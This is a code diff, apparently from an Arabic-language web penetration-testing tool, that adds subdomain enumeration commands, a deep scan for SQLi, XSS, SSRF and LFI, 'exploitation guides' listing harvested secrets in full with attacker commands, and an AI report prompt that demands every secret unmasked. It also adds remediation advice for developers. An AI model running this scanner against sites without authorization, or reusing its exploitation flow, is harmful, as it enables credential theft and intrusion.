+        `🔍 النطاقات المفحوصة: ${commonSubdomains.length}`,
+        `✅ النطاقات النشطة: ${discoveredSubdomains.length}`,
+        ``,
+        ...discoveredSubdomains.map(s =>
+          `   ${s.status < 400 ? "🟢" : "🟡"} ${s.subdomain} — HTTP ${s.status} — Server: ${s.server}`
+        ),
+        discoveredSubdomains.length === 0 ? `   ℹ️ لم يتم اكتشاف نطاقات فرعية نشطة` : "",
+        ``,
+        `═══ نطاقات فرعية حساسة يجب التحقق منها ═══`,
+        ...discoveredSubdomains.filter(s => /admin|dev|staging|test|internal|vpn|git|jenkins|ci|monitor|grafana|kibana/i.test(s.subdomain)).map(s =>
+          `   ⚠️ ${s.subdomain} — نطاق حساس متاح!`
+        ),
+      ].filter(Boolean),
+      commands: [
+        `subfinder -d ${baseDomain} -silent`,
+        `amass enum -d ${baseDomain} -passive`,
+        `for sub in ${commonSubdomains.slice(0, 10).join(" ")}; do host $sub.${baseDomain} 2>/dev/null && echo "$sub.${baseDomain} exists"; done`,
+      ],
+    },
+    // ═══ EXPLOITATION GUIDES (one step per secret type) ═══
+    ...exploitGuides.map((guide, idx) => ({
+      id: 18 + idx,
+      title: `دليل الاستغلال: ${guide.secretType}`,
+      details: `${guide.description.slice(0, 60)}...`,
+      status: "danger" as const,
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   دليل الاستغلال العملي — ${guide.secretType.padEnd(35)}     ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `🔑 السر المكتشف:`,
+        `   النوع: ${guide.secretType}`,
+        `   القيمة الكاملة: ${guide.secretValue}`,
+        ``,
+        `📋 الوصف: ${guide.description}`,
+        ``,
+        `═══ خطوات الاستغلال (كما يفعلها المخترق) ═══`,
+        ...guide.steps.map(s => `   ${s}`),
+        ``,
+        `═══ الأوامر الفعلية للاستغلال ═══`,
+        ...guide.commands.map(c => `   $ ${c}`),
+        ``,
+        `💀 التأثير: ${guide.impact}`,
+        ``,
+        `═══ خطوات الإصلاح والحماية ═══`,
+        ...guide.remediation.map((r, i) => `   ${i + 1}. ${r}`),
+      ].filter(Boolean),
+      commands: guide.commands,
+    })),
   ];
+
+  // Build exposed secrets listing for the report
+  const exposedSecretsListing = allSecrets.map(s => `• [${s.type}] ${s.value} — المصدر: ${s.source}`).join("\n");
+  const firebaseSecretsListing = [
+    firebaseApiKey ? `• Firebase API Key: ${firebaseApiKey}` : "",
+    firebaseProjectId ? `• Firebase Project ID: ${firebaseProjectId}` : "",
+    firebaseDbUrl ? `• Firebase RTDB URL: ${firebaseDbUrl}` : "",
+    firebaseAuthDomain ? `• Firebase Auth Domain: ${firebaseAuthDomain}` : "",
+    firebaseStorageBucket ? `• Firebase Storage Bucket: ${firebaseStorageBucket}` : "",
+    firebaseAppId ? `• Firebase App ID: ${firebaseAppId}` : "",
+    firebaseMessagingSenderId ? `• Firebase Messaging Sender ID: ${firebaseMessagingSenderId}` : "",
+  ].filter(Boolean).join("\n");
+  const webhookSecretsListing = [
+    ...telegramBots.map(t => `• Telegram Bot Token: ${t}`),
+    ...slackWebhooks.map(w => `• Slack Webhook: ${w}`),
+    ...discordWebhooks.map(w => `• Discord Webhook: ${w}`),
+  ].join("\n");
+  const awsSecretsListing = webCipher7AWS.map(f => `• [${f.category}] ${f.value} — ${f.detail}`).join("\n");
 
   let aiReport = "";
   try {
@@ -7793,20 +8362,56 @@ AWS: ${webCipher7AWS.length} اكتشاف
 مسارات حساسة متاحة: ${accessiblePaths.map(p => p.path).join(", ") || "لا يوجد"}
 IDOR Candidates: ${idorCandidates.length}
 
+الأسرار والمفاتيح المكتشفة (بدون تشفير — كدليل على ضعف الموقع):
+${exposedSecretsListing || "لم يتم العثور على أسرار"}
+
+إعدادات Firebase المكتشفة:
+${firebaseSecretsListing || "لا يوجد"}
+
+Webhooks مكتشفة:
+${webhookSecretsListing || "لا يوجد"}
+
+نتائج AWS:
+${awsSecretsListing || "لا يوجد"}
+
+نتائج الفحص العميق (Deep Vulnerability Scan):
+- SQL Injection: ${vulnResults.filter(v => v.type === "SQL Injection").length} ثغرة
+- XSS: ${vulnResults.filter(v => v.type === "Reflected XSS").length} ثغرة
+- SSRF: ${vulnResults.filter(v => v.type === "SSRF").length} ثغرة
+- Directory Traversal/LFI: ${vulnResults.filter(v => v.type === "Directory Traversal / LFI").length} ثغرة
+- Open Redirect: ${vulnResults.filter(v => v.type === "Open Redirect").length} ثغرة
+- CRLF Injection: ${vulnResults.filter(v => v.type === "CRLF Injection").length} ثغرة
+- النطاقات الفرعية النشطة: ${discoveredSubdomains.length}
+${vulnResults.map(v => `  [${v.severity.toUpperCase()}] ${v.type}: ${v.url} — Payload: ${v.payload}`).join("\n")}
+
 اكتب تقريراً يشمل:
 1. ملخص تنفيذي
 2. الثغرات الحرجة مع التفاصيل التقنية
 3. تحليل السطح الهجومي للويب
 4. نتائج فحص الترويسات الأمنية
 5. نتائج فحص Firebase/AWS
-6. توصيات الإصلاح بالأولوية
-7. خلاصة المخاطر`;
+6. نتائج الفحص العميق (SQLi, XSS, SSRF, LFI, Open Redirect)
+7. جميع الأسرار والمفاتيح المكتشفة مكتوبة بالكامل بدون أي تشفير أو إخفاء
+8. لكل سر مكتشف: اشرح خطوات الاستغلال العملية التي يقوم بها المخترق + الأوامر الفعلية
+9. توصيات الإصلاح بالأولوية
+10. خلاصة المخاطر
 
-    const reportResult = await callPowerAI(prompt, "", 6000);
+هام جداً: اكتب قسماً خاصاً بعنوان "رسالة إلى المبرمج/المطوّر" موجّهة لمطوّر الموقع تشرح فيها:
+- ما هي الأسرار والمفاتيح التي تم اكتشافها (اذكرها كاملة بدون أي تشفير أو إخفاء)
+- ماذا يمكن للمخترقين فعله بهذه الأسرار والمفاتيح المكشوفة (سيناريوهات هجوم واقعية)
+- ما الخطوات التي يجب اتخاذها فوراً لإصلاح هذه الثغرات
+- تحذير واضح بأن الموقع قابل للاختراق باستخدام هذه الأسرار المكشوفة`;
+
+    const reportResult = await callPowerAI(prompt, "", 8000);
     aiReport = reportResult.content;
   } catch (e: any) {
     aiReport = `تقرير اختبار اختراق الويب\n\nالموقع: ${webData.url}\nدرجة الخطورة: ${riskScore}/100\nالأسرار المكتشفة: ${allSecrets.length}\n\nملاحظة: فشل توليد التقرير التفصيلي — ${e.message}`;
   }
+
+  // Build developer warning message with full exposed secrets
+  const developerMessage = buildDeveloperMessage(webData.url, riskScore, allSecrets, {
+    firebaseApiKey, firebaseProjectId, firebaseDbUrl, firebaseAuthDomain, firebaseStorageBucket, firebaseAppId, firebaseMessagingSenderId,
+  }, telegramBots, slackWebhooks, discordWebhooks, webCipher7AWS, missingHeaders, accessiblePaths, corsVulnerable, idorCandidates);
 
   return {
     steps: webSteps,
@@ -7820,15 +8425,169 @@ IDOR Candidates: ${idorCandidates.length}
       accessiblePaths: accessiblePaths.map(p => p.path),
     },
     report: aiReport,
+    developerMessage,
+    exposedSecrets: {
+      secrets: allSecrets.map(s => ({ type: s.type, value: s.value, source: s.source })),
+      firebase: {
+        apiKey: firebaseApiKey || null,
+        projectId: firebaseProjectId || null,
+        databaseURL: firebaseDbUrl || null,
+        authDomain: firebaseAuthDomain || null,
+        storageBucket: firebaseStorageBucket || null,
+        appId: firebaseAppId || null,
+        messagingSenderId: firebaseMessagingSenderId || null,
+      },
+      webhooks: {
+        telegram: telegramBots,
+        slack: slackWebhooks,
+        discord: discordWebhooks,
+      },
+      aws: webCipher7AWS.map(f => ({ category: f.category, severity: f.severity, value: f.value, detail: f.detail })),
+    },
+    deepScan: {
+      vulnerabilities: vulnResults,
+      subdomains: discoveredSubdomains,
+      totalVulns: vulnResults.length,
+      criticalVulns: vulnResults.filter(v => v.severity === "critical").length,
+      highVulns: vulnResults.filter(v => v.severity === "high").length,
+    },
+    exploitGuides: exploitGuides.map(g => ({
+      secretType: g.secretType,
+      secretValue: g.secretValue,
+      description: g.description,
+      steps: g.steps,
+      commands: g.commands,
+      impact: g.impact,
+      remediation: g.remediation,
+    })),
     cipher7: {
       crypto: webCipher7Crypto,
       aws: webCipher7AWS,
       securityHeaders: secHeaders,
-      totalFindings: webCipher7Crypto.length + webCipher7AWS.length + allSecrets.length + accessiblePaths.length + missingHeaders.length,
-      phasesExecuted: 7,
-      engineVersion: "7.0-web",
+      totalFindings: webCipher7Crypto.length + webCipher7AWS.length + allSecrets.length + accessiblePaths.length + missingHeaders.length + vulnResults.length,
+      phasesExecuted: 10,
+      engineVersion: "10.0-web",
     },
     generatedAt: new Date().toISOString(),
     targetUrl: webData.url,
   };
+}
+
+function buildDeveloperMessage(
+  url: string, riskScore: number,
+  secrets: { type: string; value: string; source: string }[],
+  firebase: { firebaseApiKey: string; firebaseProjectId: string; firebaseDbUrl: string; firebaseAuthDomain: string; firebaseStorageBucket: string; firebaseAppId: string; firebaseMessagingSenderId: string },
+  telegramBots: string[], slackWebhooks: string[], discordWebhooks: string[],
+  awsFindings: C7AWSFinding[], missingHeaders: string[],
+  accessiblePaths: { path: string; status: number; accessible: boolean; size: number }[],
+  corsVulnerable: boolean, idorCandidates: string[],
+): string {
+  const lines: string[] = [];
+  lines.push(`╔══════════════════════════════════════════════════════════════════════════════╗`);
+  lines.push(`║   ⚠️ تنبيه أمني عاجل — رسالة إلى مطوّر/مبرمج الموقع                          ║`);
+  lines.push(`║   HAYO AI — Cipher-7 Web Penetration Testing Report                           ║`);
+  lines.push(`╚══════════════════════════════════════════════════════════════════════════════╝`);
+  lines.push(``);
+  lines.push(`عزيزي المطوّر/المبرمج،`);
+  lines.push(``);
+  lines.push(`تم إجراء اختبار اختراق أمني على موقعك: ${url}`);
+  lines.push(`درجة الخطورة الإجمالية: ${riskScore}/100 ${riskScore > 60 ? "🔴 خطر مرتفع" : riskScore > 30 ? "🟡 خطر متوسط" : "🟢 خطر منخفض"}`);
+  lines.push(``);
+
+  if (secrets.length > 0) {
+    lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+    lines.push(`🔑 الأسرار والمفاتيح المكشوفة في كود الموقع (${secrets.length} سر):`);
+    lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+    for (const s of secrets) {
+      lines.push(`   🔑 النوع: ${s.type}`);
+      lines.push(`      القيمة: ${s.value}`);
+      lines.push(`      المصدر: ${s.source}`);
+      lines.push(``);
+    }
+  }
+
+  if (firebase.firebaseApiKey || firebase.firebaseProjectId) {
+    lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+    lines.push(`🔥 إعدادات Firebase المكشوفة:`);
+    lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+    if (firebase.firebaseApiKey) lines.push(`   API Key: ${firebase.firebaseApiKey}`);
+    if (firebase.firebaseProjectId) lines.push(`   Project ID: ${firebase.firebaseProjectId}`);
+    if (firebase.firebaseDbUrl) lines.push(`   Database URL: ${firebase.firebaseDbUrl}`);
+    if (firebase.firebaseAuthDomain) lines.push(`   Auth Domain: ${firebase.firebaseAuthDomain}`);
+    if (firebase.firebaseStorageBucket) lines.push(`   Storage Bucket: ${firebase.firebaseStorageBucket}`);
+    if (firebase.firebaseAppId) lines.push(`   App ID: ${firebase.firebaseAppId}`);
+    if (firebase.firebaseMessagingSenderId) lines.push(`   Messaging Sender ID: ${firebase.firebaseMessagingSenderId}`);
+    lines.push(``);
+  }
+
+  if (telegramBots.length > 0 || slackWebhooks.length > 0 || discordWebhooks.length > 0) {
+    lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+    lines.push(`🤖 Webhooks والتوكنات المكشوفة:`);
+    lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+    for (const t of telegramBots) lines.push(`   🤖 Telegram Bot Token: ${t}`);
+    for (const s of slackWebhooks) lines.push(`   💬 Slack Webhook: ${s}`);
+    for (const d of discordWebhooks) lines.push(`   🎮 Discord Webhook: ${d}`);
+    lines.push(``);
+  }
+
+  if (awsFindings.length > 0) {
+    lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+    lines.push(`☁️ موارد AWS المكشوفة:`);
+    lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+    for (const f of awsFindings) lines.push(`   [${f.severity.toUpperCase()}] ${f.category}: ${f.value}`);
+    lines.push(``);
+  }
+
+  lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+  lines.push(`⚔️ ماذا يمكن للمخترقين فعله بهذه الأسرار المكشوفة:`);
+  lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+  const attacks: string[] = [];
+  if (secrets.some(s => s.type.includes("AWS"))) attacks.push(`   🔴 استخدام مفاتيح AWS للوصول إلى البنية التحتية السحابية والسيرفرات وقواعد البيانات والملفات`);
+  if (secrets.some(s => s.type.includes("Firebase"))) attacks.push(`   🔴 الوصول إلى قاعدة بيانات Firebase وقراءة/كتابة/حذف بيانات المستخدمين`);
+  if (secrets.some(s => s.type.includes("JWT") || s.type.includes("Bearer"))) attacks.push(`   🔴 انتحال هوية المستخدمين باستخدام التوكنات المكشوفة والوصول إلى حساباتهم`);
+  if (secrets.some(s => s.type.includes("Stripe"))) attacks.push(`   🔴 الوصول إلى بيانات الدفع وعمليات Stripe المالية`);
+  if (secrets.some(s => s.type.includes("MongoDB"))) attacks.push(`   🔴 الاتصال المباشر بقاعدة البيانات MongoDB وسرقة أو تعديل جميع البيانات`);
+  if (telegramBots.length > 0) attacks.push(`   🔴 التحكم في بوتات Telegram — إرسال رسائل، قراءة محادثات، سرقة بيانات`);
+  if (slackWebhooks.length > 0) attacks.push(`   🔴 إرسال رسائل عبر Slack Webhooks — هجمات تصيّد داخلي`);
+  if (secrets.some(s => s.type.includes("Private Key"))) attacks.push(`   🔴 استخدام المفتاح الخاص للوصول إلى السيرفرات وفك تشفير الاتصالات`);
+  if (secrets.some(s => s.type.includes("GitHub"))) attacks.push(`   🔴 الوصول إلى مستودعات GitHub الخاصة وقراءة/تعديل الكود المصدري`);
+  if (secrets.some(s => s.type.includes("SendGrid"))) attacks.push(`   🔴 إرسال رسائل بريد إلكتروني من حسابك — هجمات تصيّد بإسم شركتك`);
+  if (secrets.some(s => s.type.includes("Password"))) attacks.push(`   🔴 استخدام كلمات المرور المكشوفة لتسجيل الدخول إلى الأنظمة الداخلية`);
+  if (corsVulnerable) attacks.push(`   🔴 سرقة بيانات المستخدمين عبر ثغرة CORS من أي موقع خارجي`);
+  if (accessiblePaths.some(p => p.path === "/.env")) attacks.push(`   🔴 قراءة ملف .env والحصول على جميع المتغيرات البيئية والأسرار`);
+  if (accessiblePaths.some(p => p.path === "/.git/config")) attacks.push(`   🔴 استنساخ الكود المصدري الكامل من .git المكشوف`);
+  if (idorCandidates.length > 0) attacks.push(`   🟡 استغلال ثغرات IDOR للوصول إلى بيانات مستخدمين آخرين`);
+  if (attacks.length === 0) attacks.push(`   ✅ لم يتم اكتشاف سيناريوهات هجوم خطيرة`);
+  lines.push(...attacks);
+  lines.push(``);
+
+  lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+  lines.push(`🛠️ الإجراءات المطلوبة فوراً:`);
+  lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+  const fixes: string[] = [];
+  let fixNum = 1;
+  if (secrets.length > 0) { fixes.push(`   ${fixNum}. [حرج] احذف جميع الأسرار والمفاتيح (${secrets.length}) من كود الموقع فوراً واستخدم متغيرات البيئة (environment variables)`); fixNum++; }
+  if (secrets.some(s => s.type.includes("AWS"))) { fixes.push(`   ${fixNum}. [حرج] قم بتدوير (rotate) جميع مفاتيح AWS المكشوفة فوراً من AWS Console`); fixNum++; }
+  if (secrets.some(s => s.type.includes("Firebase"))) { fixes.push(`   ${fixNum}. [حرج] أضف Firebase Security Rules لمنع الوصول غير المصرّح`); fixNum++; }
+  if (secrets.some(s => s.type.includes("JWT") || s.type.includes("Bearer"))) { fixes.push(`   ${fixNum}. [حرج] أبطل جميع التوكنات المكشوفة وأعد إصدار توكنات جديدة`); fixNum++; }
+  if (corsVulnerable) { fixes.push(`   ${fixNum}. [حرج] أصلح إعدادات CORS — لا تستخدم wildcard (*) واحدد النطاقات المسموحة`); fixNum++; }
+  if (missingHeaders.length > 0) { fixes.push(`   ${fixNum}. [عالي] أضف الترويسات الأمنية المفقودة: ${missingHeaders.join(", ")}`); fixNum++; }
+  if (accessiblePaths.some(p => p.path === "/.env" || p.path === "/.git/config")) { fixes.push(`   ${fixNum}. [حرج] احجب الملفات الحساسة (.env, .git) في إعدادات السيرفر`); fixNum++; }
+  if (telegramBots.length > 0) { fixes.push(`   ${fixNum}. [حرج] قم بإعادة توليد توكنات Telegram Bot عبر @BotFather`); fixNum++; }
+  if (idorCandidates.length > 0) { fixes.push(`   ${fixNum}. [متوسط] أضف التحقق من الصلاحيات (authorization) في جميع API endpoints`); fixNum++; }
+  fixes.push(`   ${fixNum}. [عام] استخدم أدوات فحص الأسرار (secret scanning) في CI/CD pipeline`);
+  lines.push(...fixes);
+  lines.push(``);
+
+  lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+  lines.push(`⚠️ تحذير: موقعك قابل للاختراق!`);
+  lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+  lines.push(`هذا التقرير يُثبت أن الأسرار والمفاتيح أعلاه يمكن لأي مخترق الوصول إليها.`);
+  lines.push(`يجب اتخاذ الإجراءات الواردة أعلاه فوراً لحماية موقعك وبيانات المستخدمين.`);
+  lines.push(`كل يوم تأخير يزيد من خطر الاختراق وسرقة البيانات.`);
+  lines.push(``);
+  lines.push(`— تم إنشاء هذا التقرير بواسطة HAYO AI — Cipher-7 Web Penetration Testing Engine`);
+  lines.push(`— التاريخ: ${new Date().toLocaleString("ar-EG")}`);
+
+  return lines.join("\n");
 }
